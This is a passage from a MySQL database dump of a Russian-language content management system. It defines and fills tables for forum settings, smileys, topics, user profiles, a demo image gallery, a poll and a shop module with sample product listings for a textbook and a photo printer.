  UNIQUE KEY `boxwidthcomm` (`boxwidthcomm`),
  UNIQUE KEY `boxwidthforums` (`boxwidthforums`),
  UNIQUE KEY `maxlengthword` (`maxlengthword`),
  UNIQUE KEY `maxlines` (`maxlines`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_forum_settings`
-- 

INSERT INTO `cp_modul_forum_settings` VALUES (300, 300, 50, 150, 'Arschloch,Ficken,Drecksau', '***', '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">\r\n<html xmlns="http://www.w3.org/1999/xhtml">\r\n<head>\r\n<meta http-equiv="Content-Type" content="text/html; charset=windows-1251" />', 'formsg@mail.ru', 'Admin', 1, 1, 1, 1);

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_forum_smileys`
-- 

CREATE TABLE `cp_modul_forum_smileys` (
  `id` int(11) NOT NULL auto_increment,
  `posi` mediumint(5) NOT NULL default '1',
  `active` enum('1','0') NOT NULL default '1',
  `code` char(15) NOT NULL,
  `path` char(55) NOT NULL,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=14 DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_forum_smileys`
-- 

INSERT INTO `cp_modul_forum_smileys` VALUES (1, 14, '1', ';)', 'wink.gif');
INSERT INTO `cp_modul_forum_smileys` VALUES (2, 13, '1', ':eek:', 'eek.gif');
INSERT INTO `cp_modul_forum_smileys` VALUES (3, 15, '1', ':(', 'mad.gif');
INSERT INTO `cp_modul_forum_smileys` VALUES (4, 12, '1', ':D', 'biggrin.gif');
INSERT INTO `cp_modul_forum_smileys` VALUES (5, 11, '1', ':P', 'tongue.gif');
INSERT INTO `cp_modul_forum_smileys` VALUES (6, 9, '1', ':cool:', 'cool.gif');
INSERT INTO `cp_modul_forum_smileys` VALUES (7, 8, '1', ':kisses:', 'kisses.gif');
INSERT INTO `cp_modul_forum_smileys` VALUES (8, 7, '1', ':rolleyes:', 'rolleyes.gif');
INSERT INTO `cp_modul_forum_smileys` VALUES (9, 6, '0', ':schlecht:', 'schlecht.gif');
INSERT INTO `cp_modul_forum_smileys` VALUES (10, 5, '0', ':unsicher:', 'unsure.gif');
INSERT INTO `cp_modul_forum_smileys` VALUES (11, 3, '1', ':)', 'smile.gif');
INSERT INTO `cp_modul_forum_smileys` VALUES (12, 2, '1', ':^^:', 'lol.gif');
INSERT INTO `cp_modul_forum_smileys` VALUES (13, 1, '1', ':cry:', 'cry.gif');

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_forum_topic`
-- 

CREATE TABLE `cp_modul_forum_topic` (
  `id` int(11) NOT NULL auto_increment,
  `title` varchar(200) NOT NULL default '',
  `status` int(11) default '0',
  `views` int(11) NOT NULL default '0',
  `rating` text,
  `forum_id` int(11) NOT NULL default '0',
  `icon` smallint(5) unsigned default NULL,
  `posticon` smallint(5) unsigned default NULL,
  `datum` datetime NOT NULL default '0000-00-00 00:00:00',
  `replies` int(10) unsigned NOT NULL default '0',
  `uid` smallint(5) unsigned NOT NULL default '0',
  `notification` text NOT NULL,
  `type` tinyint(1) NOT NULL default '0',
  `last_post` datetime default NULL,
  `last_post_id` int(11) default NULL,
  `opened` tinyint(4) NOT NULL default '1',
  `last_post_int` int(14) NOT NULL default '0',
  PRIMARY KEY  (`id`),
  KEY `forum_id` (`forum_id`),
  KEY `opened` (`opened`),
  KEY `uid` (`uid`),
  KEY `title` (`title`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_forum_topic`
-- 

INSERT INTO `cp_modul_forum_topic` VALUES (1, 'Добро пожаловать!', 0, 57, NULL, 1, NULL, 0, '2008-05-10 11:45:16', 5, 1, '', 0, '2010-03-26 04:16:56', NULL, 1, 1269566216);
INSERT INTO `cp_modul_forum_topic` VALUES (2, 'Геология', 0, 134, NULL, 2, NULL, 0, '2009-01-09 11:59:20', 2, 1, '', 0, '2009-01-09 12:03:06', NULL, 1, 1231491786);
INSERT INTO `cp_modul_forum_topic` VALUES (3, 'Астрономия', 0, 3, NULL, 2, NULL, 0, '2009-01-09 12:08:28', 1, 1, '', 1, '2009-01-09 12:08:28', NULL, 1, 1231492108);

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_forum_topic_read`
-- 

CREATE TABLE `cp_modul_forum_topic_read` (
  `Usr` int(11) NOT NULL default '0',
  `Topic` int(11) NOT NULL default '0',
  `ReadOn` timestamp NOT NULL default CURRENT_TIMESTAMP on update CURRENT_TIMESTAMP,
  PRIMARY KEY  (`Usr`,`Topic`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_forum_topic_read`
-- 

INSERT INTO `cp_modul_forum_topic_read` VALUES (1, 2, '2010-05-03 05:39:32');
INSERT INTO `cp_modul_forum_topic_read` VALUES (1, 1, '2010-06-23 13:49:08');
INSERT INTO `cp_modul_forum_topic_read` VALUES (1, 3, '2010-05-02 22:52:49');
INSERT INTO `cp_modul_forum_topic_read` VALUES (0, 1, '2010-01-11 04:38:16');
INSERT INTO `cp_modul_forum_topic_read` VALUES (0, 2, '2010-05-03 05:37:52');
INSERT INTO `cp_modul_forum_topic_read` VALUES (2, 2, '2010-05-03 05:38:25');

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_forum_useronline`
-- 

CREATE TABLE `cp_modul_forum_useronline` (
  `ip` char(25) NOT NULL default '0',
  `uid` int(10) unsigned NOT NULL default '0',
  `expire` int(10) NOT NULL default '0',
  `uname` char(255) NOT NULL,
  `invisible` char(10) NOT NULL,
  UNIQUE KEY `ip` (`ip`),
  KEY `expire` (`expire`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_forum_useronline`
-- 

INSERT INTO `cp_modul_forum_useronline` VALUES ('127.0.0.1', 1, 1277287118, 'Admin', '0');

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_forum_userprofile`
-- 

CREATE TABLE `cp_modul_forum_userprofile` (
  `Id` int(14) unsigned NOT NULL auto_increment,
  `BenutzerId` int(14) unsigned NOT NULL default '0',
  `BenutzerName` varchar(200) default NULL,
  `BenutzerNameChanged` mediumint(3) unsigned default '0',
  `GroupIdMisc` text,
  `Beitraege` int(10) unsigned NOT NULL default '0',
  `ZeigeProfil` tinyint(1) unsigned NOT NULL default '1',
  `Signatur` tinytext,
  `Icq` varchar(150) default NULL,
  `Aim` varchar(150) default NULL,
  `Skype` varchar(150) default NULL,
  `Emailempfang` tinyint(1) unsigned NOT NULL default '1',
  `Pnempfang` tinyint(1) unsigned NOT NULL default '1',
  `Avatar` varchar(255) default NULL,
  `AvatarStandard` tinyint(1) NOT NULL default '1',
  `Webseite` varchar(255) default NULL,
  `Unsichtbar` tinyint(1) unsigned NOT NULL default '1',
  `Interessen` text,
  `Email` varchar(200) default NULL,
  `reg_time` int(10) unsigned NOT NULL default '0',
  `GeburtsTag` varchar(10) default NULL,
  `Email_show` tinyint(1) unsigned NOT NULL default '0',
  `Icq_show` tinyint(1) unsigned NOT NULL default '1',
  `Aim_show` tinyint(1) unsigned NOT NULL default '1',
  `Skype_show` tinyint(1) unsigned NOT NULL default '1',
  `Interessen_show` tinyint(1) unsigned NOT NULL default '1',
  `Signatur_show` tinyint(1) unsigned NOT NULL default '1',
  `GeburtsTag_show` tinyint(1) unsigned NOT NULL default '1',
  `Webseite_show` tinyint(1) unsigned NOT NULL default '1',
  `Geschlecht` enum('male','female') NOT NULL default 'male',
  PRIMARY KEY  (`Id`),
  UNIQUE KEY `BenutzerId` (`BenutzerId`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=cp1251 PACK_KEYS=0;

-- 
-- Дамп данных таблицы `cp_modul_forum_userprofile`
-- 

INSERT INTO `cp_modul_forum_userprofile` VALUES (1, 1, 'Admin', 0, '', 8, 1, '', '', '', '', 1, 1, '', 0, '', 0, '', 'formsg@mail.ru', 1250295071, '', 0, 1, 1, 1, 1, 1, 1, 1, 'male');

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_gallery`
-- 

CREATE TABLE `cp_modul_gallery` (
  `id` int(10) unsigned NOT NULL auto_increment,
  `gallery_title` varchar(255) NOT NULL,
  `gallery_description` text NOT NULL,
  `gallery_author_id` int(10) unsigned NOT NULL default '1',
  `gallery_created` int(10) unsigned NOT NULL default '0',
  `gallery_thumb_width` smallint(3) unsigned NOT NULL default '120',
  `gallery_image_on_line` tinyint(1) unsigned NOT NULL default '4',
  `gallery_title_show` enum('1','0') NOT NULL default '1',
  `gallery_description_show` enum('1','0') NOT NULL default '1',
  `gallery_image_size_show` enum('0','1') NOT NULL default '0',
  `gallery_type` tinyint(1) unsigned NOT NULL default '4',
  `gallery_image_on_page` tinyint(1) unsigned NOT NULL default '12',
  `gallery_watermark` varchar(255) NOT NULL,
  `gallery_folder` varchar(255) NOT NULL,
  `gallery_orderby` enum('datedesc','dateasc','titleasc','titledesc','position') NOT NULL default 'datedesc',
  `gallery_script` text NOT NULL,
  `gallery_image_template` text NOT NULL,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=cp1251 PACK_KEYS=0;

-- 
-- Дамп данных таблицы `cp_modul_gallery`
-- 

INSERT INTO `cp_modul_gallery` VALUES (1, 'Демонстрационная галерея', 'Эта галерея создана для ознакомления с возможностями модуля', 1, 1250295071, 120, 4, '1', '1', '', 7, 12, 'watermark.gif', '', 'position', '<script src="/cms/modules/gallery/templates/js/clearbox.js?lng=ru&dir=/cms/modules/gallery/templates/js/clearbox" type="text/javascript"></script>', '<a href="/cms/modules/gallery/uploads/[tag:gal:folder][tag:img:filename]" rel="clearbox[gallery=Демонстрационная галерея,,comment=[tag:img:description]]" title="[tag:img:title]"><img src="[tag:img:thumbnail]" /></a>');

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_gallery_images`
-- 

CREATE TABLE `cp_modul_gallery_images` (
  `id` int(10) unsigned NOT NULL auto_increment,
  `gallery_id` int(10) unsigned NOT NULL default '0',
  `image_filename` varchar(255) NOT NULL,
  `image_author_id` int(10) unsigned NOT NULL default '0',
  `image_title` varchar(255) NOT NULL,
  `image_description` text NOT NULL,
  `image_file_ext` char(4) NOT NULL,
  `image_date` int(10) unsigned NOT NULL default '0',
  `image_position` smallint(3) unsigned NOT NULL default '1',
  PRIMARY KEY  (`id`),
  KEY `image_position` (`image_position`),
  KEY `image_date` (`image_date`),
  KEY `gallery_id` (`gallery_id`),
  KEY `image_title` (`image_title`)
) ENGINE=MyISAM AUTO_INCREMENT=62 DEFAULT CHARSET=cp1251 PACK_KEYS=0;

-- 
-- Дамп данных таблицы `cp_modul_gallery_images`
-- 

INSERT INTO `cp_modul_gallery_images` VALUES (1, 1, 'crocodile.jpg', 1, 'Крокодил', '', '.jpg', 1250295071, 1);
INSERT INTO `cp_modul_gallery_images` VALUES (2, 1, 'dolphin.jpg', 1, 'Дельфин', '', '.jpg', 1250295071, 1);
INSERT INTO `cp_modul_gallery_images` VALUES (3, 1, 'duck.jpg', 1, 'Утка', '', '.jpg', 1250295071, 1);
INSERT INTO `cp_modul_gallery_images` VALUES (4, 1, 'eagle.jpg', 1, 'Орел', '', '.jpg', 1250295071, 7);
INSERT INTO `cp_modul_gallery_images` VALUES (5, 1, 'jellyfish.jpg', 1, 'Медузы', '', '.jpg', 1250295071, 1);
INSERT INTO `cp_modul_gallery_images` VALUES (6, 1, 'killer_whale.jpg', 1, 'Касатка', '', '.jpg', 1250295071, 6);
INSERT INTO `cp_modul_gallery_images` VALUES (7, 1, 'leaf.jpg', 1, 'Лист', '', '.jpg', 1250295071, 1);
INSERT INTO `cp_modul_gallery_images` VALUES (8, 1, 'spider.jpg', 1, 'Паук', '', '.jpg', 1250295071, 5);

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_login`
-- 

CREATE TABLE `cp_modul_login` (
  `Id` tinyint(1) unsigned NOT NULL auto_increment,
  `login_reg_type` enum('now','email','byadmin') NOT NULL default 'now',
  `login_antispam` enum('0','1') NOT NULL default '0',
  `login_status` enum('1','0') NOT NULL default '1',
  `login_deny_domain` text NOT NULL,
  `login_deny_email` text NOT NULL,
  `login_require_company` enum('0','1') NOT NULL default '0',
  `login_require_firstname` enum('0','1') NOT NULL default '0',
  `login_require_lastname` enum('0','1') NOT NULL default '0',
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_login`
-- 

INSERT INTO `cp_modul_login` VALUES (1, 'email', '0', '1', 'domain.ru', 'name@domain.ru', '0', '0', '0');

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_newsarchive`
-- 

CREATE TABLE `cp_modul_newsarchive` (
  `id` mediumint(5) unsigned NOT NULL auto_increment,
  `newsarchive_name` char(100) NOT NULL default '',
  `newsarchive_rubrics` char(255) NOT NULL default '',
  `newsarchive_show_days` enum('1','0') NOT NULL default '1',
  `newsarchive_show_empty` enum('1','0') NOT NULL default '1',
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=cp1251 PACK_KEYS=0;

-- 
-- Дамп данных таблицы `cp_modul_newsarchive`
-- 

INSERT INTO `cp_modul_newsarchive` VALUES (1, 'Первый архив', '1,2,3', '1', '1');

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_poll`
-- 

CREATE TABLE `cp_modul_poll` (
  `id` int(10) unsigned NOT NULL auto_increment,
  `poll_title` varchar(255) NOT NULL default '',
  `poll_status` enum('1','0') NOT NULL default '1',
  `poll_can_comment` enum('0','1') NOT NULL default '0',
  `poll_groups_id` tinytext,
  `poll_start` int(10) unsigned NOT NULL default '0',
  `poll_end` int(10) unsigned NOT NULL default '0',
  `poll_users_id` text NOT NULL,
  `poll_users_ip` text NOT NULL,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_poll`
-- 

INSERT INTO `cp_modul_poll` VALUES (1, 'Тестовый опрос', '1', '1', '1,2,3,4', 1278366240, 1309902240, '', '127.0.0.1');

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_poll_comments`
-- 

CREATE TABLE `cp_modul_poll_comments` (
  `id` int(10) unsigned NOT NULL auto_increment,
  `poll_id` int(10) NOT NULL,
  `poll_comment_author_id` int(10) NOT NULL,
  `poll_comment_author_ip` text NOT NULL,
  `poll_comment_time` int(10) unsigned NOT NULL default '0',
  `poll_comment_title` varchar(250) NOT NULL default '',
  `poll_comment_text` text NOT NULL,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_poll_comments`
-- 


-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_poll_items`
-- 

CREATE TABLE `cp_modul_poll_items` (
  `id` int(10) unsigned NOT NULL auto_increment,
  `poll_id` int(10) NOT NULL,
  `poll_item_title` varchar(250) NOT NULL default '',
  `poll_item_hits` int(10) NOT NULL default '0',
  `poll_item_color` varchar(10) NOT NULL default '',
  `poll_item_position` int(2) NOT NULL,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_poll_items`
-- 

INSERT INTO `cp_modul_poll_items` VALUES (1, 1, 'Первый', 24, '#FF0000', 1);
INSERT INTO `cp_modul_poll_items` VALUES (2, 1, 'Второй', 12, '#00FF00', 2);
INSERT INTO `cp_modul_poll_items` VALUES (3, 1, 'Третий', 35, '#0000FF', 3);

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_search`
-- 

CREATE TABLE `cp_modul_search` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `search_query` char(255) NOT NULL,
  `search_count` mediumint(5) unsigned NOT NULL default '0',
  `search_found` mediumint(5) unsigned NOT NULL default '0',
  PRIMARY KEY  (`Id`),
  UNIQUE KEY `search_query` (`search_query`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251 PACK_KEYS=0;

-- 
-- Дамп данных таблицы `cp_modul_search`
-- 


-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_shop`
-- 

CREATE TABLE `cp_modul_shop` (
  `Id` tinyint(1) unsigned NOT NULL auto_increment,
  `status` enum('0','1') NOT NULL default '0',
  `Waehrung` varchar(10) NOT NULL default 'RUR',
  `WaehrungSymbol` varchar(10) NOT NULL default 'руб.',
  `Waehrung2` varchar(10) NOT NULL default 'EUR',
  `WaehrungSymbol2` varchar(10) NOT NULL default '&euro;',
  `Waehrung2Multi` decimal(10,4) NOT NULL default '1.0000',
  `ShopLand` char(2) NOT NULL default 'RU',
  `ArtikelMax` mediumint(3) unsigned NOT NULL default '10',
  `KaufLagerNull` tinyint(1) unsigned NOT NULL default '0',
  `VersandLaender` tinytext NOT NULL,
  `VersFrei` tinyint(1) unsigned NOT NULL default '0',
  `VersFreiBetrag` decimal(7,2) NOT NULL default '0.00',
  `GutscheinCodes` tinyint(1) unsigned NOT NULL default '1',
  `ZeigeEinheit` tinyint(1) unsigned NOT NULL default '1',
  `ZeigeNetto` tinyint(1) NOT NULL default '1',
  `KategorienStart` tinyint(1) unsigned NOT NULL default '1',
  `KategorienSons` tinyint(1) unsigned NOT NULL default '1',
  `ZufallsAngebot` tinyint(1) unsigned NOT NULL default '1',
  `ZufallsAngebotKat` tinyint(1) unsigned NOT NULL default '1',
  `BestUebersicht` tinyint(1) unsigned NOT NULL default '1',
  `Merkliste` tinyint(1) unsigned NOT NULL default '1',
  `Topseller` tinyint(1) unsigned NOT NULL default '1',
  `TemplateArtikel` varchar(100) NOT NULL default '',
  `Vorschaubilder` mediumint(3) NOT NULL default '80',
  `Topsellerbilder` mediumint(3) NOT NULL default '40',
  `GastBestellung` tinyint(1) unsigned default '0',
  `Kommentare` tinyint(1) unsigned default '1',
  `KommentareGast` tinyint(1) NOT NULL default '0',
  `ZeigeWaehrung2` tinyint(1) unsigned default '0',
  `ShopKeywords` varchar(255) default '',
  `ShopDescription` varchar(255) default '',
  `required_intro` tinyint(1) unsigned default '1',
  `required_desc` tinyint(1) unsigned default '1',
  `required_price` tinyint(1) unsigned default '1',
  `required_stock` tinyint(1) unsigned default '1',
  `company_name` varchar(255) default '',
  `custom` int(10) unsigned NOT NULL,
  `delivery` int(10) unsigned default '0',
  `delivery_local` int(10) unsigned default '0',
  `downloadable` int(10) unsigned default '0',
  `track_label` tinyint(1) unsigned default '0',
  `ShopWillkommen` text NOT NULL,
  `ShopFuss` text NOT NULL,
  `VersandInfo` text NOT NULL,
  `DatenschutzInf` text NOT NULL,
  `Impressum` text NOT NULL,
  `Agb` text NOT NULL,
  `AdresseText` text NOT NULL,
  `AdresseHTML` text NOT NULL,
  `Logo` varchar(255) NOT NULL default '',
  `EmailFormat` enum('text','html') NOT NULL default 'text',
  `AbsEmail` varchar(255) NOT NULL default '',
  `AbsName` varchar(255) NOT NULL default '',
  `EmpEmail` varchar(255) NOT NULL default '',
  `BetreffBest` varchar(255) NOT NULL default '',
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_shop`
-- 

INSERT INTO `cp_modul_shop` VALUES (1, '1', 'RUR', 'р', 'EUR', '€', 1.0000, 'RU', 10, 0, 'BY,RU,UA', 0, 0.00, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 'shop_items.tpl', 80, 40, 1, 1, 1, 0, '', '', 1, 1, 1, 1, 'AVE.cms', 3, 1, 1, 4, 0, '<h2 id="page-heading">Это первая приветственная страница модуля магазин&nbsp;</h2>\r\n<p>Этот текст правим в админке в разделе <strong>Модули</strong> &raquo; <strong>Магазин</strong> &raquo; <strong>Страницы помощи</strong> &raquo; <strong>Текст приветствия</strong>.</p>', '<p>Этот текст правим в админке в разделе <strong>Модули</strong> &raquo; <strong>Магазин</strong>  &raquo; <strong>Страницы помощи</strong> &raquo; <strong>Информация в нижней части страницы</strong>.</p>', '<h2 id="page-heading">Сведения о доставке</h2>\r\n<p>Этот текст правим в админке в разделе <strong>Модули</strong> &raquo; <strong>Магазин</strong>  &raquo; <strong>Страницы помощи</strong> &raquo; <strong>Сведения о доставке</strong>.</p>', '<h2 id="page-heading">Сервисные центры</h2>\r\n<p>Этот текст правим в админке в разделе <strong>Модули</strong> &raquo; <strong>Магазин</strong>  &raquo; <strong>Страницы помощи</strong> &raquo; <strong>Сервисные центры</strong>.</p>', '<h2 id="page-heading">О продавце</h2>\r\n<p>Этот текст правим в админке в разделе <strong>Модули</strong> &raquo; <strong>Магазин</strong>  &raquo; <strong>Страницы помощи</strong> &raquo; <strong>О продавце</strong>.</p>', '<p>Этот текст правим в админке в разделе <strong>Модули</strong> &raquo; <strong>Магазин</strong>  &raquo; <strong>Страницы помощи</strong> &raquo; <strong>Лицензионное соглашение</strong>.</p>', '', '', '', 'text', '', '', '', '');

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_shop_artikel`
-- 

CREATE TABLE `cp_modul_shop_artikel` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `ArtNr` varchar(200) NOT NULL,
  `KatId` int(10) unsigned NOT NULL default '0',
  `KatId_Multi` text NOT NULL,
  `ArtName` varchar(255) NOT NULL,
  `status` smallint(1) unsigned NOT NULL default '1',
  `Preis` decimal(10,2) NOT NULL default '0.00',
  `PreisListe` decimal(10,2) NOT NULL default '0.00',
  `Bild` varchar(255) NOT NULL,
  `Bild_Typ` varchar(10) NOT NULL default 'jpg',
  `Bilder` text NOT NULL,
  `TextKurz` text NOT NULL,
  `TextLang` text NOT NULL,
  `Gewicht` decimal(6,3) NOT NULL default '0.000',
  `Angebot` tinyint(1) unsigned NOT NULL default '0',
  `AngebotBild` varchar(255) NOT NULL,
  `UstZone` smallint(2) unsigned NOT NULL default '1',
  `Erschienen` int(14) unsigned NOT NULL default '0',
  `Frei_Titel_1` varchar(100) NOT NULL,
  `Frei_Text_1` text NOT NULL,
  `Frei_Titel_2` varchar(100) NOT NULL,
  `Frei_Text_2` text NOT NULL,
  `Frei_Titel_3` varchar(100) NOT NULL,
  `Frei_Text_3` text NOT NULL,
  `Frei_Titel_4` varchar(100) NOT NULL,
  `Frei_Text_4` text NOT NULL,
  `Hersteller` mediumint(5) NOT NULL,
  `Schlagwoerter` tinytext NOT NULL,
  `Einheit` decimal(7,2) NOT NULL default '0.00',
  `EinheitId` int(10) unsigned NOT NULL default '0',
  `Lager` int(10) unsigned NOT NULL default '0',
  `VersandZeitId` smallint(2) unsigned NOT NULL default '1',
  `Bestellungen` int(10) unsigned NOT NULL default '0',
  `DateiDownload` varchar(255) NOT NULL,
  `PosiStartseite` smallint(2) unsigned NOT NULL default '1',
  `ProdKeywords` varchar(255) NOT NULL default '',
  `ProdDescription` varchar(255) NOT NULL default '',
  `country_of_origin` varchar(255) NOT NULL default '',
  `bid` int(5) unsigned NOT NULL default '0',
  `cbid` int(5) unsigned NOT NULL default '0',
  PRIMARY KEY  (`Id`),
  UNIQUE KEY `ArtNr` (`ArtNr`),
  KEY `KatId` (`KatId`),
  KEY `ArtName` (`ArtName`),
  KEY `Hersteller` (`Hersteller`),
  KEY `Preis` (`Preis`),
  KEY `Erschienen` (`Erschienen`),
  KEY `Bestellungen` (`Bestellungen`),
  KEY `Angebot` (`Angebot`),
  FULLTEXT KEY `Schlagwoerter` (`Schlagwoerter`)
) ENGINE=MyISAM AUTO_INCREMENT=18 DEFAULT CHARSET=cp1251 PACK_KEYS=0;

-- 
-- Дамп данных таблицы `cp_modul_shop_artikel`
-- 

INSERT INTO `cp_modul_shop_artikel` VALUES (7, 'BUCH_0002', 5, '27', 'Программа по информатике и ИКТ системно-информационная концепция 2-е изд', 1, 40.00, 0.00, 'book_2.jpg', 'jpg', '', '<p>2-е издание, 2007 год, 128 стр., формат 13x20 см (84х108/32), Мягкая обложка, ISBN 978-5-469-01664-9</p>', '<p>В методическом пособии представлена программа преподавания дисциплины &laquo;Информатика и ИКТ&raquo; в школе с 5-го по 11-й класс на основе системно-информационной концепции. В программе приведены обоснование актуальности этой дисциплины в школе и требования Государственного образовательного стандарта РФ к уровню знаний и умений выпускника школы. Изложены основные положения системно-информационной концепции, на основе которой ведется обучение. Определены цели, разработаны рекомендации и содержание для трех уровней обучения: начального в основной школе и базового в старшей школе. Приведено тематическое планирование для трех уровней обучения.<br />\r\nМетодической поддержкой данной программы преподавания служит учебно-методический комплект из десяти учебников и учебных пособий &laquo;Информатика и ИКТ&raquo; под редакцией проф. Н. В. Макаровой для учащихся и трех методических пособий для учителей.<br />\r\nРекомендуется преподавателям школ и педагогических вузов, методистам всех уровней, научным работникам.</p>\r\n<p></p>', 0.500, 0, '', 1, 1148068800, 'Об авторе', '<p>Макарова Наталья Владимировна &mdash; заслуженный работник высшей школы Российской Федерации, заведующий кафедрой информационных систем и технологий, академик МАН ВШ, профессор, доктор педагогических наук, кандидат технических наук. Макарова  Н. В. имеет многочисленные награды и благодарности.<br />\r\n<br />\r\nМеждународная организация &laquo;International Soros Science Education Program&raquo; присвоила ей звание &laquo;Соросовский профессор&raquo;. Наталья Владимировна автор более 200 публикаций среди которых книги, статьи, учебно-методическая литература.<br />\r\n<br />\r\nС 1997 г. по настоящее время Макаровой  Н. В. ведется постоянная работа над учебниками по информатике для школ, результатом которой является вышедший в издательстве &laquo;Питер&raquo; учебно-методический комплект из 11-ти наименований, имеющий гриф Министерства образования РФ.</p>', '', '&nbsp;', '', '&nbsp;', '', '&nbsp;', 2, 'книга', 0.00, 0, 1000, 1, 0, '', 1, '', '', '', 0, 0);
INSERT INTO `cp_modul_shop_artikel` VALUES (6, 'CP-10056', 1, '1,25', 'Epson Stylus Photo R1900', 1, 72.00, 0.00, 'epson.jpg', 'jpg', '', '<p>Формат фотографий до А3+. Печать на рулонной бумаге А3 и А3+. &nbsp;Разрешение 5760 x 1440 dpi. &nbsp;Чернила Epson UltraChrome Hi-Gloss2, 8 цветов. &nbsp;Сохранение качества изображения до 80 лет</p>\r\n<p></p>', '<p>EPSON Stylus Photo R1900 - высококлассный принтер формата А3+, воплощающий новейшие технологические достижения EPSON в области струйной фотопечати и отвечающий самым взыскательным требованиям профессиональных фотографов и опытных фотолюбителей.&nbsp;<br />\r\n<br />\r\nБлагодаря новой восьмицветной системе печати пигментными чернилами Ultra Chrome Hi-Gloss2 принтер воспроизводит максимально широкий цветовой охват, превышающий цветовой охват традиционной системы фотопечати. При этом светостойкость чернил достигает 100 лет*, что значительно превосходит аналоговую фотопечать.&nbsp;<br />\r\n<br />\r\nПринтер поддерживает печать на самых различных носителях, в том числе на рулонной бумаге и компакт-дисках. Использование восьми раздельных картриджей снижает себестоимость печати. Высокая скорость печати и низкий уровень шума делают его незаменимым элементом профессиональной фотостудии.&nbsp;<br />\r\n<br />\r\nНовые пигментные чернила EPSON UltraChrome Hi-Gloss2<br />\r\nВ принтере EPSON Stylus Photo R1900 используются новые пигментные чернила EPSON Ultra Chrome Hi-Gloss2, разработанные специально для профессиональной фотопечати. Обеспечивают непревзойденное качество печати фотографий, чрезвычайно высокую стойкость к внешним воздействиям и широкий цветовой охват, значительно превосходящий охват аналоговой печати с использованием галогенида серебра.</p>', 2.000, 1, '/uploads/images/adv_epson.gif', 1, 1148068800, 'Характеристики', '<p></p>\r\n<ul>\r\n    <li>Новые пигментные чернила Epson Ultra Chrome Hi-Gloss2 - светостойкость более 100 лет*</li>\r\n    <li>Восьмицветная система для максимально широкого цветового охвата</li>\r\n    <li>Оранжевый краситель для точной передачи телесных тонов</li>\r\n    <li>Технология оптимизации глянца - для улучшения качества печати на глянцевых носителях</li>\r\n    <li>Два глянцевых картриджа в комплекте</li>\r\n    <li>Высочайшее качество фотопечати с разрешением до 5760 х 1440 dpi</li>\r\n    <li>Маленький размер чернильной капли &ndash; 1.5 пиколитра</li>\r\n    <li>Новая таблица преобразования (LUT &ndash; Look Up Table)</li>\r\n    <li>Печать фотографий без полей &ndash; на листовой и рулонной бумаге</li>\r\n    <li>Печать на художественных носителях</li>\r\n    <li>Восемь раздельных картриджей</li>\r\n    <li>Печать на CD/DVD/MCD</li>\r\n    <li>Два порта USB Hi-Speed (USB 2.0)</li>\r\n    <li>Прямая печать через PictBridge</li>\r\n    <li>Для фото и дизайна</li>\r\n</ul>\r\n<p></p>', '', '', '', '&nbsp;', '', '&nbsp;', 1, 'принтер', 0.00, 0, 999, 1, 12, '', 1, '', '', '', 0, 0);
